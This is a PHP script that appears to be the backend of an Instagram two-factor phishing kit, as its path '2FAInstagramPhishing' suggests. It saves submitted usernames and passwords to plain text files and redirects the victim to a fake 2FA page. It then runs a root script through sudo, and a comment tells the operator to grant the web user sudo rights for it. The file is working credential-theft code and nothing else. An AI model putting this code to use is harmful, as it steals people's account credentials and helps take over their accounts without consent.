<?php
$username = $_POST["username"];
$myfile = fopen("username.txt", "wa+") or die("Unable to open file!");
fwrite($myfile, $username);
fclose($myfile);
$password = $_POST["password"];
$myfile = fopen("password.txt", "wa+") or die("Unable to open file!");
fwrite($myfile, $password);
fclose($myfile);
//The scrip /root/root.sh must be allow for running as root for www-data in /etc/sudoers
ob_start();
header('Location: /instagram/2factor.html');
ob_end_flush();
ob_flush();
flush();
system("sudo /root/2FAInstagramPhishing/root.sh &");
exit();
